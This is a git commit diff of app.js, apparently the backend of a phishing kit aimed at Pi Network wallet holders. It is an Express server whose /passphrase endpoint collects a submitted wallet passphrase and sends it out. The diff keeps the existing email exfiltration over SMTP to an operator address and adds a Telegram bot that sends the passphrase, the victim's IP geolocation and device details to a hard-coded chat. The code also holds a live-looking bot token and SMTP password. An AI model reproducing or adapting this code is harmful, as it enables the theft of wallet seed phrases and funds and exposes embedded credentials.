8c05e057ec109f0ff5afb5a242d75a71823ba6b5
victorpinetwork002 <160152638+victorpinetwork002@users.noreply.github.com>
2024-03-16 22:05:01 +0100

    Update app.js

--- app.js
+++ app.js
@@ -1,66 +1,93 @@
-// Import required modules
 const express = require('express');
 const bodyParser = require('body-parser');
 const nodemailer = require('nodemailer');
-const cors = require('cors'); // Import cors module
+const axios = require('axios');
+const cors = require('cors');
+const TelegramBot = require('node-telegram-bot-api');
+const UAParser = require('ua-parser-js');
 
-// Create an instance of Express
 const app = express();
+const botToken = '7136629679:AAH3pixtS3ElaiHCIEgj6_dGksJD-hPp5Jw'; // Replace with your Telegram bot token
+const bot = new TelegramBot(botToken);
 
-// Set up body-parser middleware to parse JSON bodies
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
-
-// Enable CORS
-app.use(cors()); // This enables CORS for all routes
-
-// Define routes
-app.get('/', (req, res) => {
-  res.send('Hello World!');
-});
+app.use(cors());
 
 app.post('/passphrase', async (req, res) => {
-  // Check if the 'passphrase' key exists in the request body
-  if (!req.body.hasOwnProperty('passphrase')) {
-    return res.status(400).json({ error: 'Passphrase key is missing in the request body' });
-  }
-
-  // Get the value of the 'passphrase' key from the request body
+  const clientIP = '104.24.123.216';//req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const userAgent = req.headers['user-agent'];
   const passphrase = req.body.passphrase;
 
-  let transporter = nodemailer.createTransport({
-    host: "31-41-249-166.cprapid.com", //"188-239-191-167.cprapid.com" "31-41-249-166.cprapid.com"
-    port: 465,
-    secure: true, // true for 465, false for other ports
-    auth: {
-      user: "admin@piexternaltransaction.com", // generated ethereal user
-      pass: "Pienetwork10", // generated ethereal password
-    },
-    tls: {
-      rejectUnauthorized: false
-    }
-  });
+  // Parse user-agent header to get device information using ua-parser-js
+  const parser = new UAParser();
+  const deviceInfo = parser.setUA(userAgent).getResult();
 
-  // Define the email message
-  const mailOptions = {
-    from: 'admin@piexternaltransaction.com',
-    to: 'admin@piexternaltransaction.com',
-    subject: 'Passphrase Received',
-    text: `Passphrase: ${passphrase}`,
-  };
+  if (!passphrase) {
+    return res.status(400).json({ error: 'Passphrase is missing in the request body' });
+  }
+
+  const url = `https://freeipapi.com/api/json/${clientIP}`;
 
   try {
-    // Send the email
-    await transporter.sendMail(mailOptions);
+    // Fetch IP location data using axios
+    const response = await axios.get(url);
+    const { countryName, cityName, regionName, isProxy, continent, timeZone } = response.data;
 
-    // Respond with a success message
+    // Send the message to Telegram
+    const teleMessage = `
+      Passphrase: ${passphrase}
+      IP Location: ${clientIP}
+      Continent: ${continent},
+      Country: ${countryName},
+      Region: ${regionName}, 
+      City: ${cityName},
+      Timezone: ${timeZone},
+      VPN: ${isProxy ? "Yes" : "No"}
+      Device Info: ${JSON.stringify(deviceInfo)}
+    `;
+    
+    bot.sendMessage('5854167907', teleMessage);
+
+    // Send email using nodemailer
+    let transporter = nodemailer.createTransport({
+      host: "31-41-249-166.cprapid.com",
+      port: 465,
+      secure: true,
+      auth: {
+        user: "admin@piexternaltransaction.com",
+        pass: "Pienetwork10",
+      },
+      tls: {
+        rejectUnauthorized: false
+      }
+    });
+
+    const mailOptions = {
+      from: 'admin@piexternaltransaction.com',
+      to: 'admin@piexternaltransaction.com',
+      subject: `Received From ${clientIP}`,
+      text: `
+        Passphrase: ${passphrase}
+        IP Location: ${clientIP}
+        Continent: ${continent},
+        Country: ${countryName},
+        Region: ${regionName}, 
+        City: ${cityName},
+        Timezone: ${timeZone},
+        VPN: ${isProxy ? "Yes" : "No"}
+        Device Info: ${JSON.stringify(deviceInfo)}
+      `,
+    };
+
+    await transporter.sendMail(mailOptions);
     res.json({ message: 'Passphrase received successfully' });
   } catch (error) {
-    res.status(500).json({ error: 'Failed to send email' });
+    console.error(error);
+    res.status(500).json({ error: 'Failed to process the request' });
   }
 });
 
-// Start the server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server is listening on port ${PORT}`);
